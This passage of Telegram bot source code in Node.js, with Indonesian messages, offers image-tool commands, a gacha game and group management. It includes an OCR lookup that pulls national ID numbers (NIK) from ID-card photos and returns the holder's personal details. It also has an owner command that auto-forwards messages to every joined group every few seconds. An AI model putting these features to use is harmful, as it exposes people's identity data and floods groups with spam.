  // search for any contiguous 16 digits inside cleaned or original with regex of 16 digits
  const m = cleaned.match(/(\d{16})/);
  if (m) return m[1];
  // fallback: search original text for groups of digits (with separators)
  const m2 = text.match(/(\d[\d\.\- ]{14,}\d)/g);
  if (!m2) return null;
  // flatten first match to digits only
  const candidate = m2[0].replace(/\D/g, '');
  return candidate.length === 16 ? candidate : null;
}

// format response text nicely
function formatNikResult(obj) {
  if (!obj) return 'Tidak ada data.';
  const r = obj;
  const lines = [];
  lines.push(`📄 *Hasil Pencarian NIK*`);
  lines.push(`• NIK: ${r.nik || '-'}`);
  lines.push(`• Nama (tidak tersedia di parser ini)`);
  lines.push(`• Jenis Kelamin: ${r.kelamin || '-'}`);
  lines.push(`• Lahir: ${r.lahir_lengkap || r.lahir || '-'}`);
  lines.push(`• Provinsi: ${r.provinsi ? r.provinsi.nama : '-'}`);
  lines.push(`• Kabupaten/Kota: ${r.kotakab ? r.kotakab.nama : '-'}`);
  lines.push(`• Kecamatan: ${r.kecamatan ? r.kecamatan.nama : '-'}`);
  lines.push(`• Kode Wilayah: ${r.kode_wilayah || '-'}`);
  lines.push(`• Nomor Urut: ${r.nomor_urut || '-'}`);
  if (r.tambahan) {
    lines.push('');
    lines.push(`🔎 Tambahan:`);
    if (r.tambahan.pasaran) lines.push(`• Pasaran: ${r.tambahan.pasaran}`);
    if (r.tambahan.usia) lines.push(`• Usia: ${r.tambahan.usia}`);
    if (r.tambahan.kategori_usia) lines.push(`• Kategori: ${r.tambahan.kategori_usia}`);
    if (r.tambahan.zodiak) lines.push(`• Zodiak: ${r.tambahan.zodiak}`);
  }
  return lines.join('\n');
}

// COMMAND: /nik <nik>
// or: reply to photo with /nik
bot.onText(/\/nik(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  let input = match && match[1] ? match[1].trim() : null;

  try {
    // If reply to message and no input, try get image from reply
    if (!input && msg.reply_to_message) {
      // if photo
      if (msg.reply_to_message.photo && msg.reply_to_message.photo.length) {
        await bot.sendMessage(chatId, '⏳ Menerima foto, mencoba OCR untuk menemukan NIK...');
        const fileId = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id;
        const file = await bot.getFile(fileId);
        const buffer = await downloadTelegramFileBuffer(file.file_path);

        const ocrText = await ocrSpaceImageBuffer(buffer);
        if (!ocrText) {
          // OCR tidak berhasil / no key
          if (!OCR_KEY) {
            return bot.sendMessage(chatId, '⚠️ OCR tidak dikonfigurasi (OCR_SPACE_API_KEY kosong). Silakan kirim NIK secara manual, contoh: `/nik 5315030810080020`');
          }
          return bot.sendMessage(chatId, '⚠️ OCR gagal mengenali teks di gambar. Silakan kirim NIK secara manual. (Atau coba foto yang lebih jelas).');
        }

        // try extract nik
        const nikFound = extractNik(ocrText);
        if (!nikFound) {
          console.log('OCR text but no NIK:', ocrText.slice(0,300));
          return bot.sendMessage(chatId, '⚠️ OCR berhasil, tapi tidak menemukan NIK 16 digit. Silakan kirim NIK manual atau kirim foto yang lebih jelas.\n\n_Contoh:_ `/nik 5315030810080020`', { parse_mode: 'Markdown' });
        }
        input = nikFound; // continue to parsing
        await bot.sendMessage(chatId, `✅ OCR menemukan NIK: \`${input}\`. Memanggil nikparser...`, { parse_mode: 'Markdown' });
      }
      // if document image
      else if (msg.reply_to_message.document && msg.reply_to_message.document.mime_type && msg.reply_to_message.document.mime_type.startsWith('image')) {
        await bot.sendMessage(chatId, '⏳ Menerima dokumen gambar, mencoba OCR...');
        const fileId = msg.reply_to_message.document.file_id;
        const file = await bot.getFile(fileId);
        const buffer = await downloadTelegramFileBuffer(file.file_path);

        const ocrText = await ocrSpaceImageBuffer(buffer);
        if (!ocrText) {
          if (!OCR_KEY) {
            return bot.sendMessage(chatId, '⚠️ OCR tidak dikonfigurasi (OCR_SPACE_API_KEY kosong). Silakan kirim NIK secara manual, contoh: `/nik 5315030810080020`');
          }
          return bot.sendMessage(chatId, '⚠️ OCR gagal mengenali teks di gambar. Silakan kirim NIK secara manual.');
        }
        const nikFound = extractNik(ocrText);
        if (!nikFound) {
          console.log('OCR text but no NIK:', ocrText.slice(0,300));
          return bot.sendMessage(chatId, '⚠️ OCR berhasil, tapi tidak menemukan NIK 16 digit. Silakan kirim NIK manual atau kirim foto yang lebih jelas.');
        }
        input = nikFound;
        await bot.sendMessage(chatId, `✅ OCR menemukan NIK: \`${input}\`. Memanggil nikparser...`, { parse_mode: 'Markdown' });
      }
    }

    if (!input) {
      return bot.sendMessage(chatId, '❗ Gunakan `/nik <NIK>` atau balas foto KTP dengan perintah `/nik`.');
    }

    // sanitize input and check 16 digits
    const digits = input.replace(/\D/g, '');
    if (digits.length !== 16) {
      return bot.sendMessage(chatId, '❗ NIK tidak valid. NIK harus 16 digit. Contoh: `/nik 5315030810080020`');
    }

    // call nikparser
    await bot.sendChatAction(chatId, 'typing');
    let apiRes;
    try {
      apiRes = await callNikParser(digits);
    } catch (e) {
      console.error('callNikParser error:', e?.response?.data || e.message || e);
      return bot.sendMessage(chatId, '❌ Gagal memanggil nikparser. Cek log server.');
    }

    if (!apiRes || apiRes.success !== true) {
      console.log('nikparser fail:', apiRes);
      return bot.sendMessage(chatId, `❌ nikparser returned: ${apiRes && apiRes.message ? apiRes.message : JSON.stringify(apiRes)}`);
    }

    const pretty = formatNikResult(apiRes.result);
    // send formatted result
    await bot.sendMessage(chatId, pretty, { parse_mode: 'Markdown' });

    // also send raw JSON (optional, helpful for debugging)
    await bot.sendMessage(chatId, '📦 Raw JSON result (untuk debugging):\n' + '```json\n' + JSON.stringify(apiRes, null, 2) + '\n```', { parse_mode: 'Markdown' });

  } catch (err) {
    console.error('unexpected /nik error:', err?.response?.data || err?.message || err);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat memproses. Cek log server.');
  }
});
// Ambil link file Telegram (file image) dari file_id
async function getTelegramFileUrl(fileId) {
  try {
    return await bot.getFileLink(fileId); // node-telegram-bot-api helper
  } catch (err) {
    console.error('getTelegramFileUrl error:', err?.response?.data || err.message || err);
    throw new Error('Gagal ambil file dari Telegram');
  }
}
 
async function tryNekoEndpointsSequential(endpoints, promptText, imageUrl) {
  const base = 'https://api.nekolabs.web.id';

  for (const ep of endpoints) {
    const url = `${base}${ep.path}?prompt=${encodeURIComponent(promptText)}&imageUrl=${encodeURIComponent(imageUrl)}`;
    const headers = {};

    if (ep.apiKeyEnv) {
      const key = process.env[ep.apiKeyEnv];
      if (key) headers['Authorization'] = `Bearer ${key}`;
      else {
        // jika env key tidak tersedia, tetap coba (tapi kemungkinan error)
        console.warn(`Env key ${ep.apiKeyEnv} tidak ditemukan. Mencoba endpoint ${ep.path} tanpa header Authorization.`);
      }
    }

    try {
      console.log(`Mencoba endpoint: ${url} (key env: ${ep.apiKeyEnv || 'none'})`);
      const res = await axios.get(url, { headers, timeout: 120000 });

      // Anggap sukses jika res.data.success === true dan ada result
      if (res.data && res.data.success && res.data.result) {
        console.log(`Berhasil di ${ep.path}`);
        return { success: true, data: res.data };
      } else {
        console.warn(`Endpoint ${ep.path} merespon tapi tidak sukses:`, res.data);
        // lanjut ke endpoint berikutnya
      }
    } catch (err) {
      // Log error dan lanjut ke endpoint berikutnya
      // Bisa berupa network error, 4xx/5xx, timeout, dsb.
      console.warn(`Error saat memanggil ${ep.path}:`, err?.response?.data || err.message || err);
      // lanjut ke percobaan berikutnya
    }
  }

  // jika semua gagal
  throw new Error('Semua endpoint Nekolabs gagal atau tidak mengembalikan hasil.');
}

// Command: /nanobanana <prompt>
// Must reply to a photo (atau document image)
bot.onText(/^\/nanobanana(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const promptText = match[1] ? match[1].trim() : '';

  try {
    // cek reply
    if (!msg.reply_to_message) {
      return bot.sendMessage(chatId, '❗ Perintah ini harus *reply* ke foto. Balas foto dengan perintah:\n/nanobanana <prompt>', { parse_mode: 'Markdown' });
    }

    // ambil foto dari pesan yang di-reply
    const reply = msg.reply_to_message;
    let fileId;
    if (reply.photo && reply.photo.length) {
      // ambil ukuran terbesar
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.document && reply.document.mime_type && reply.document.mime_type.startsWith('image')) {
      fileId = reply.document.file_id;
    } else {
      return bot.sendMessage(chatId, '❗ File yang di-reply bukan gambar. Reply ke foto atau file gambar.');
    }

    if (!promptText) {
      return bot.sendMessage(chatId, '❗ Tambahkan prompt setelah perintah. Contoh:\n/nanobanana Buat foto ini menjadi berddua dan persis');
    }

    // beri tahu user
    await bot.sendChatAction(chatId, 'upload_photo');
    const processingMsg = await bot.sendMessage(chatId, '🔧 Mengirim permintaan ke server... tunggu sebentar.');

    // dapatkan URL file Telegram
    const imageUrl = await getTelegramFileUrl(fileId);

    // daftar endpoint yang dicoba berurutan
    const endpoints = [
      { path: '/image-generation/nano-banana/v2', apiKeyEnv: 'NEKOLABS_KEY_V2' },
      { path: '/image-generation/nano-banana/v3', apiKeyEnv: 'NEKOLABS_KEY_V3' },
      { path: '/image-generation/nano-banana/v4', apiKeyEnv: 'NEKOLABS_KEY_V4' },
      { path: '/image-generation/nano-banana/v5', apiKeyEnv: 'NEKOLABS_KEY_V5' },
      // v6 di akhir; tidak pakai key (sesuai keteranganmu)
      { path: '/image-generation/nano-banana/v6', apiKeyEnv: null },
    ];

    // panggil helper untuk mencoba berurutan
    let apiResponse;
    try {
      const result = await tryNekoEndpointsSequential(endpoints, promptText, imageUrl);
      apiResponse = result.data;
    } catch (e) {
      console.error('Semua percobaan endpoint gagal:', e.message || e);
      await bot.sendMessage(chatId, '❌ Semua endpoint Nekolabs gagal. Coba lagi nanti.');
      // hapus processing message
      try { await bot.deleteMessage(chatId, processingMsg.message_id); } catch (e) { /* ignore */ }
      return;
    }

    const resultUrl = apiResponse.result;
    if (!resultUrl) {
      console.error('Tidak ada result URL di response akhir:', apiResponse);
      await bot.sendMessage(chatId, '❌ Respon API tidak berisi gambar hasil.');
      try { await bot.deleteMessage(chatId, processingMsg.message_id); } catch (e) { /* ignore */ }
      return;
    }

    // kirim hasil ke chat (kirim foto dari URL yang dikembalikan)
    await bot.sendPhoto(chatId, resultUrl, {
      caption: `✅ Selesai — prompt: ${promptText}`
    });

    // hapus pesan processing (opsional)
    try { await bot.deleteMessage(chatId, processingMsg.message_id); } catch (e) { /* ignore */ }

  } catch (err) {
    console.error('/nanobanana error:', err?.response?.data || err.message || err);
    await bot.sendMessage(chatId, `⚠️ Terjadi kesalahan: ${err.message ? err.message : 'Unknown error'}`);
  }
});

// ===== COMMAND: /nsfwcheck =====
bot.onText(/^\/nsfwcheck(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsText = match[1] || "";

  await bot.sendChatAction(chatId, "typing");

  // --------- Ambil URL gambar ---------
  async function extractImageUrl(msg, argsText) {
    // Jika user memberikan URL langsung
    if (argsText.length > 5) {
      try {
        new URL(argsText);
        return argsText;
      } catch {}
    }

    // Jika reply foto
    if (msg.reply_to_message?.photo) {
      const photos = msg.reply_to_message.photo;
      const fileId = photos[photos.length - 1].file_id;
      return await bot.getFileLink(fileId);
    }

    // Jika reply dokumen yang berupa foto
    if (msg.reply_to_message?.document) {
      return await bot.getFileLink(msg.reply_to_message.document.file_id);
    }

    // Jika user mengirim foto di pesan yang sama
    if (msg.photo) {
      const photos = msg.photo;
      const fileId = photos[photos.length - 1].file_id;
      return await bot.getFileLink(fileId);
    }

    return null;
  }

  const imageUrl = await extractImageUrl(msg, argsText);
  if (!imageUrl) {
    return bot.sendMessage(chatId,
      "⚠️ *Tidak ada gambar ditemukan*\n\nGunakan:\n`/nsfwcheck <url>`\nAtau balas gambar dengan perintah ini.",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const encoded = encodeURIComponent(imageUrl);
    const apiUrl = `https://api.nekolabs.web.id/tools/nsfw/categorize?imageUrl=${encoded}`;

    const response = await axios.get(apiUrl, { timeout: 15000 });

    const data = response.data.result;

    const resultText = `
🔎 *Hasil NSFW Check*
———————————————
🧩 *Classification:* ${data.classification}
📊 *Confidence:* ${data.confidence}%
🚫 *NSFW:* ${data.nsfw ? "Ya ❗️" : "Tidak ✔️"}
🔞 *Porn:* ${data.porn ? "Ya ❗️" : "Tidak ✔️"}
🆔 *Image Hash:* \`${data.hash}\`
`;

    bot.sendMessage(chatId, resultText, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses gambar.");
  }
});
// Helper: get best photo file id if message contains photos
function getPhotoFileId(msg) {
  if (!msg.photo) return null;
  // Telegram sends array of sizes, last is largest
  const sizes = msg.photo;
  return sizes[sizes.length - 1].file_id;
}

// Helper: try to get an image URL from message (argument or reply photo or document)
async function extractImageUrl(msg, args) {
  // 1. If user provided an argument that looks like URL, use it
  if (args && args.length) {
    const maybe = args.join(' ');
    try {
      const u = new URL(maybe);
      if (u.protocol === 'http:' || u.protocol === 'https:') return maybe;
    } catch (_) { /* not a valid URL */ }
  }

  // 2. If message is a reply to a photo
  if (msg.reply_to_message) {
    // photo
    const fileId = getPhotoFileId(msg.reply_to_message);
    if (fileId) {
      return await bot.getFileLink(fileId); // returns a Telegram file link
    }

    // document (maybe an image as document)
    if (msg.reply_to_message.document) {
      return await bot.getFileLink(msg.reply_to_message.document.file_id);
    }
  }

  // 3. If user sent photo in same message (not reply)
  const fileId = getPhotoFileId(msg);
  if (fileId) {
    return await bot.getFileLink(fileId);
  }
  if (msg.document) {
    return await bot.getFileLink(msg.document.file_id);
  }

  return null;
}
// Main command: /gura
bot.onText(/^\/gura(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsText = match && match[1] ? match[1].trim() : '';
  const args = argsText ? argsText.split(/\s+/) : [];

  await bot.sendChatAction(chatId, 'upload_photo');

  let imageUrl;
  try {
    imageUrl = await extractImageUrl(msg, args);
    if (!imageUrl) {
      return bot.sendMessage(chatId, '📷 Kirim gambar atau balas pesan gambar, atau sertakan URL gambar: `/gura https://...`', { parse_mode: 'Markdown' });
    }

    // encode the image URL for API query param
    const encoded = encodeURIComponent(imageUrl);
    const apiUrl = `https://api.nekolabs.web.id/canvas/gura?imageUrl=${encoded}`;

    // fetch resulting image (API likely returns image bytes)
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
      timeout: 20000, // 20s
      headers: {
        // optional: set a browser-like user-agent
        'User-Agent': 'Mozilla/5.0 (TelegramBot)'
      }
    });

    // You can check content-type to ensure it's an image
    const contentType = response.headers['content-type'] || '';
    if (!contentType.startsWith('image/')) {
      // if API returns JSON with error message, try to send that
      const text = Buffer.from(response.data).toString('utf8');
      return bot.sendMessage(chatId, `Server response bukan gambar:\n\`\`\`\n${text}\n\`\`\``, { parse_mode: 'Markdown' });
    }

    const buffer = Buffer.from(response.data);

    // send file back
    await bot.sendPhoto(chatId, buffer, { caption: '✨ Hasil Gura' });
  } catch (err) {
    console.error('Error processing /gura:', err?.message || err);
    // if axios error with response data try to show message
    let errMsg = 'Terjadi kesalahan saat memproses gambar.';
    if (err.response && err.response.data) {
      try {
        const txt = Buffer.from(err.response.data).toString();
        errMsg += `\nServer: ${txt}`;
      } catch (_) {}
    } else if (err.message) {
      errMsg += `\n${err.message}`;
    }
    bot.sendMessage(chatId, `❌ ${errMsg}`);
  }
});

const GROUPS_FILE = "./SINGGLE ERA/groups.json";
let groups = [];

// Load groups dari file
if (fs.existsSync(GROUPS_FILE)) {
  groups = JSON.parse(fs.readFileSync(GROUPS_FILE));
}

// Simpan groups ke file
function saveGroups() {
  fs.writeFileSync(GROUPS_FILE, JSON.stringify(groups, null, 2));
}

// Tangkap semua pesan masuk untuk otomatis daftar grup
bot.on("message", (msg) => {
  if (msg.chat && (msg.chat.type === "group" || msg.chat.type === "supergroup")) {
    if (!groups.includes(msg.chat.id)) {
      groups.push(msg.chat.id);
      saveGroups();
    }
  }
});

// ========================================================
// /shere FINAL (HANYA UNTUK GRUP + HANYA UNTUK AKSES)
// ========================================================

function isAllowed(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

bot.onText(/^\/share$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isAllowed(userId)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak punya akses untuk menggunakan perintah ini.");
  }

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "⚠️ Reply ke pesan yang mau di-share.");
  }

  const replyMsg = msg.reply_to_message;

  let success = 0;
  let failed = 0;

  if (!Array.isArray(groups) || groups.length === 0) {
    return bot.sendMessage(chatId, "⚠️ Bot belum gabung ke grup manapun.");
  }

  for (const groupId of groups) {
    try {
      await bot.forwardMessage(groupId, chatId, replyMsg.message_id);
      success++;
    } catch (e) {
      failed++;
      console.log(chalk.red(`Gagal forward ke grup ${groupId}: ${e.message}`));
    }
  }

  try {
    await bot.forwardMessage(chatId, chatId, replyMsg.message_id);
  } catch (e) {
    console.log(chalk.red(`Gagal forward ke user sendiri: ${e.message}`));
  }

  const result = `
📊 <b>Hasil Share (Forward)</b>

<blockquote>
✔ Berhasil diteruskan: <b>${success} grup</b>
❌ Gagal: <b>${failed} grup</b>
</blockquote>
`;

  bot.sendMessage(chatId, result, { parse_mode: "HTML" });
});

// ========================================================
// /autoshere & /stop
// ========================================================

let autoShereIntervals = {}; // Simpan interval per user (OWNER_ID)

// Fungsi untuk cek akses
function isAllowed(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

// Fungsi untuk melakukan forward ke semua grup (sama seperti /shere)
async function forwardToGroups(replyMsg, chatId) {
  let success = 0;
  let failed = 0;

  if (!Array.isArray(groups) || groups.length === 0) {
    return { success, failed, error: "⚠️ Bot belum gabung ke grup manapun." };
  }

  for (const groupId of groups) {
    try {
      await bot.forwardMessage(groupId, chatId, replyMsg.message_id);
      success++;
    } catch (e) {
      failed++;
      console.log(chalk.red(`Gagal forward ke grup ${groupId}: ${e.message}`));
    }
  }

  try {
    await bot.forwardMessage(chatId, chatId, replyMsg.message_id);
  } catch (e) {
    console.log(chalk.red(`Gagal forward ke user sendiri: ${e.message}`));
  }

  return { success, failed };
}

// ========================================================
// /autoshere <interval>
// contoh: /autoshere 10d  -> 10 detik
//          /autoshere 1m  -> 1 menit
// ========================================================
bot.onText(/^\/autoshare (\d+)([dm])$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isAllowed(userId)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak punya akses untuk menggunakan perintah ini.");
  }

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "⚠️ Reply ke pesan yang mau di-autoshere.");
  }

  const intervalValue = parseInt(match[1]);
  const intervalUnit = match[2];

  // Hitung interval dalam ms
  let intervalMs = intervalValue * 1000; // default detik
  if (intervalUnit === "m") intervalMs = intervalValue * 60 * 1000;

  // Hentikan dulu kalau user sudah ada autoShere aktif
  if (autoShereIntervals[userId]) {
    clearInterval(autoShereIntervals[userId]);
    delete autoShereIntervals[userId];
  }

  const replyMsg = msg.reply_to_message;

  autoShereIntervals[userId] = setInterval(async () => {
    const { success, failed, error } = await forwardToGroups(replyMsg, chatId);

    if (error) {
      return bot.sendMessage(chatId, error);
    }

    const result = `
📊 <b>Hasil AutoShare</b>

<blockquote>
✔ Berhasil diteruskan: <b>${success} grup</b>
❌ Gagal: <b>${failed} grup</b>
</blockquote>
`;
    bot.sendMessage(chatId, result, { parse_mode: "HTML" });
  }, intervalMs);

  bot.sendMessage(chatId, `✅ AutoShare aktif setiap ${intervalValue}${intervalUnit}. Gunakan /stop untuk berhenti.`);
});

// ========================================================
// /stop
// ========================================================
bot.onText(/^\/stop$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isAllowed(userId)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak punya akses untuk menggunakan perintah ini.");
  }

  if (autoShereIntervals[userId]) {
    clearInterval(autoShereIntervals[userId]);
    delete autoShereIntervals[userId];
    bot.sendMessage(chatId, "🛑 AutoShare dihentikan.");
  } else {
    bot.sendMessage(chatId, "⚠️ Tidak ada AutoShare aktif.");
  }
});

// ========================================================
// /listgroup
// ========================================================

bot.onText(/^\/cekjoingroup$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // CEK HAK AKSES
  if (!isAllowed(userId)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak punya akses untuk menggunakan perintah ini.");
  }

  if (!Array.isArray(groups) || groups.length === 0) {
    return bot.sendMessage(chatId, "⚠️ Bot belum gabung ke grup manapun.");
  }

  let listText = "";
  let activeGroups = [];
  let index = 1;

  for (let i = 0; i < groups.length; i++) {
    const groupId = groups[i];

    try {
      // Cek apakah bot masih ada di grup
      const chatInfo = await bot.getChat(groupId);

      // Kalau berhasil, berarti masih join
      activeGroups.push(groupId);

      const admins = await bot.getChatAdministrators(groupId);
      const creator = admins.find(a => a.status === "creator");

      const groupName = chatInfo.title || "Tidak diketahui";

      let creatorUsername = "-";
      let creatorId = "-";

      if (creator && creator.user) {
        const u = creator.user;
        creatorUsername = u.username ? `@${u.username}` : "Tidak ada";
        creatorId = u.id;
      }

      listText +=
        `${index}. Nama Grup : ${groupName}\n` +
        `   ID Grup : ${groupId}\n` +
        `   Username Pembuat : ${creatorUsername}\n` +
        `   UserId Pembuat : ${creatorId}\n\n`;

      index++;

    } catch (err) {
      // Jika error (403 / bot sudah keluar), JANGAN tampilkan
      // dan otomatis diabaikan
      continue;
    }
  }

  // Update groups hanya dengan grup aktif
  groups.length = 0;
  groups.push(...activeGroups);

  if (activeGroups.length === 0) {
    return bot.sendMessage(chatId, "⚠️ Bot tidak sedang berada di grup manapun.");
  }

  const result =
`📋 Daftar Grup Aktif (Masih Bot Join)

${listText}
Total Grup Aktif: ${activeGroups.length}`;

  bot.sendMessage(chatId, result);
});

bot.onText(/^\/outallgroup$/, async (msg) => {
  const chatId = msg.chat.id;      // grup/tempat perintah dikirim
  const userId = msg.from.id;

  // CEK HAK AKSES
  if (!isAllowed(userId)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak punya akses untuk menggunakan perintah ini.");
  }

  if (!Array.isArray(groups) || groups.length === 0) {
    return bot.sendMessage(chatId, "⚠️ Bot belum gabung ke grup manapun.");
  }

  let success = 0;
  let failed = 0;
  let detailText = "";

  // daftar grup baru yang tetap disimpan (misal grup ini + grup yang gagal ditinggalkan)
  const newGroups = [];

  for (let i = 0; i < groups.length; i++) {
    const groupId = groups[i];

    // JANGAN keluar dari grup tempat perintah dikirim
    if (groupId === chatId) {
      newGroups.push(groupId);
      continue;
    }

    try {
      // Ambil nama grup sebelum keluar
      const chatInfo = await bot.getChat(groupId);
      const groupName = chatInfo.title || "Tidak diketahui";

      // Kirim notif ke grup tersebut sebelum keluar
      try {
        await bot.sendMessage(
          groupId,
          "🚪 Bot akan keluar dari grup ini atas perintah pemilik bot."
        );
      } catch (e) {
        // kalau gagal kirim pesan, tetap lanjut leaveChat
      }

      await bot.leaveChat(groupId);
      success++;

      detailText += `${success + failed}. ${groupName} ✅\n`;
    } catch (err) {
      failed++;
      detailText += `${success + failed}. ID ${groupId} ❌ (gagal keluar)\n`;
      // kalau gagal keluar, simpan lagi groupId supaya tetap tercatat
      newGroups.push(groupId);
    }
  }

  // Update isi groups: hanya grup yang tidak ditinggalkan
  groups.length = 0;
  newGroups.forEach(g => groups.push(g));

  const result =
`🚪 Keluar dari Semua Grup (kecuali grup ini)

Berhasil keluar dari : ${success}
Gagal keluar dari    : ${failed}

Detail:
${detailText || "-(tidak ada perubahan)-"}

Status : Selesai`;

  bot.sendMessage(chatId, result);
});

const ITEM_DIR = "./itemgacha";
const DATA_USERS = "./data/users.json";
const DATA_LINK = "./data/configlink.json";

// Buat folder/data jika belum ada
if (!fs.existsSync(ITEM_DIR)) fs.mkdirSync(ITEM_DIR);
if (!fs.existsSync("./data")) fs.mkdirSync("./data");

if (!fs.existsSync(DATA_USERS)) fs.writeFileSync(DATA_USERS, "{}");
if (!fs.existsSync(DATA_LINK)) fs.writeFileSync(DATA_LINK, JSON.stringify({ link: "" }));

// Fungsi Read/Write
const readItems = () => {
  const file = path.join(ITEM_DIR, "items.json");
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file));
};
const writeItems = (x) => fs.writeFileSync(path.join(ITEM_DIR, "items.json"), JSON.stringify(x, null, 2));

const readUsers = () => JSON.parse(fs.readFileSync(DATA_USERS));
const writeUsers = (x) => fs.writeFileSync(DATA_USERS, JSON.stringify(x, null, 2));

const readLink = () => JSON.parse(fs.readFileSync(DATA_LINK)).link;
const writeLink = (url) => fs.writeFileSync(DATA_LINK, JSON.stringify({ link: url }, null, 2));

const todayKey = () => new Date().toISOString().slice(0, 10);
const COOLDOWN_SECONDS = 5;

// ===============================
// 🔧 /SETLINK — Owner Saja
// ===============================
bot.onText(/\/setlink (.+)/, (msg, match) => {
  if (!OWNER_ID.includes(String(msg.from.id)))
    return bot.sendMessage(msg.chat.id, "❌ Hanya owner yang bisa menggunakan perintah ini.");

  const username = match[1].trim();

  writeLink(username);

  bot.sendMessage(msg.chat.id, `✅ Username channel/grup berhasil di-set:\n${username}`);
});

// ===============================
// 🔍 CEK JOIN CHANNEL/GRUP
// ===============================
async function checkJoin(userId) {
  const username = readLink(); // contoh: "@kepoluyee"
  if (!username) return false;
await sleep(1200); // 1.2 detik

  try {
    // Ambil info chat dari username
    const chat = await bot.getChat(username);

    // Cek status membership user
    const member = await bot.getChatMember(chat.id, userId);

    return ["creator", "administrator", "member"].includes(member.status);
  } catch (err) {
    console.error("checkJoin error:", err.message);
    return false;
  }
}

// ===============================
// ⭐ ADD ITEM (OWNER ONLY)
// ===============================
bot.onText(/\/additem(?:\s+(.+))?/, async (msg, match) => {
  if (!OWNER_ID.includes(String(msg.from.id)))
    return bot.sendMessage(msg.chat.id, "❌ Hanya owner yang bisa menambah item.");

  if (!msg.reply_to_message)
    return bot.sendMessage(
      msg.chat.id,
      "📎 Balas pesan berisi file/text untuk dijadikan item.\n\nFormat:\n/additem <nama>|<weight>|<isZonk>"
    );

  const arg = match[1] || "";
  let [_, weightStr, isZonkStr] = arg.split("|").map(s => s && s.trim()); 
  const weight = parseFloat(weightStr) || 1;
  const isZonk = isZonkStr === "true";

  const r = msg.reply_to_message;
  const items = readItems();
  const id = Date.now();

  let name = "";       // Nama auto
  let filePath = null;
  let fileType = "none";

  // ===========================
  // 📄 DOCUMENT → Nama = nama file asli
  // ===========================
  if (r.document) {
    const fileId = r.document.file_id;
    const fileName = r.document.file_name || `${id}.bin`;

    name = fileName; // AUTO NAME

    try {
      const fileLink = await bot.getFileLink(fileId);
      const savePath = path.join(ITEM_DIR, fileName);

      const res = await axios.get(fileLink, { responseType: "arraybuffer" });
      fs.writeFileSync(savePath, res.data);

      filePath = savePath;
      fileType = "localDocument";

    } catch (e) {
      return bot.sendMessage(msg.chat.id, "❌ Gagal menyimpan dokumen.");
    }
  }

  // ===========================
  // 🖼 PHOTO → Nama = photo_<id>.jpg
  // ===========================
  else if (r.photo) {
    const photos = r.photo;
    const fileId = photos[photos.length - 1].file_id;

    name = `photo_${id}.jpg`; // AUTO NAME FOTO

    filePath = fileId;
    fileType = "photo";
  }

  // ===========================
  // 📝 TEXT → Nama = text yang direply
  // ===========================
  else if (r.text || r.caption) {
    name = (r.text || r.caption).substring(0, 50); // Max 50 char
    fileType = "text";
  }

  const newItem = { id, name, weight, isZonk, fileType, filePath };
  items.push(newItem);
  writeItems(items);

  // OUTPUT SIMPLE
  bot.sendMessage(
    msg.chat.id,
    `✅ Item ${name} berhasil ditambahkan!\n💌 Total item sekarang: ${items.length}`,
    { parse_mode: "Markdown" }
  );
});
// ===============================
// ❌ DELETE ITEM (OWNER ONLY)
// ===============================
bot.onText(/\/delitem (\d+)/, (msg, match) => {
  if (!OWNER_ID.includes(String(msg.from.id)))
    return bot.sendMessage(msg.chat.id, "❌ Owner Only.");

  const num = parseInt(match[1]); // nomor urut
  let items = readItems();

  if (isNaN(num) || num < 1 || num > items.length) {
    return bot.sendMessage(msg.chat.id, "⚠️ Nomor item tidak valid.");
  }

  // index array = nomor - 1
  const removed = items.splice(num - 1, 1);  
  writeItems(items);

  bot.sendMessage(
    msg.chat.id,
    `🗑️ Item nomor ${num} berhasil dihapus!\n📛 Nama: <b>${removed[0].name}</b>`,
    { parse_mode: "HTML" }
  );
});

// ===============================
// 🎲 WEIGHT PICK
// ===============================
function weightedPick(items) {
  const total = items.reduce((s, i) => s + (i.weight || 1), 0);
  let r = Math.random() * total;
  for (const it of items) {
    r -= it.weight || 1;
    if (r <= 0) return it;
  }
  return items[items.length - 1];
}

// ===============================
// 🎰 GACHA
// ===============================
bot.onText(/\/gacha/, async (msg) => {
  const chatId = msg.chat.id;

  // CEK USERNAME CHANNEL SUDAH DISET
  const link = readLink(); // contoh: "@kepoluyee"
  if (!link)
    return bot.sendMessage(
      chatId,
      "⚠️ Owner belum mengatur syarat gacha!\nGunakan /setlink @usernameChannel"
    );

  // CEK USER SUDAH JOIN CHANNEL/GRUP
  const joined = await checkJoin(msg.from.id);
  if (!joined)
    return bot.sendMessage(
      chatId,
      `🚫 Kamu harus join terlebih dahulu:\n${link}`
    );

  // DATA USER
  const users = readUsers();
  if (!users[chatId]) {
    users[chatId] = { id: chatId, gachaCount: 0, gachaDate: todayKey(), lastGachaTime: 0 };
  }

  // RESET HARIAN
  if (users[chatId].gachaDate !== todayKey()) {
    users[chatId].gachaCount = 0;
    users[chatId].gachaDate = todayKey();
  }

  // CEK COOLDOWN
  const now = Date.now();
  const last = users[chatId].lastGachaTime || 0;
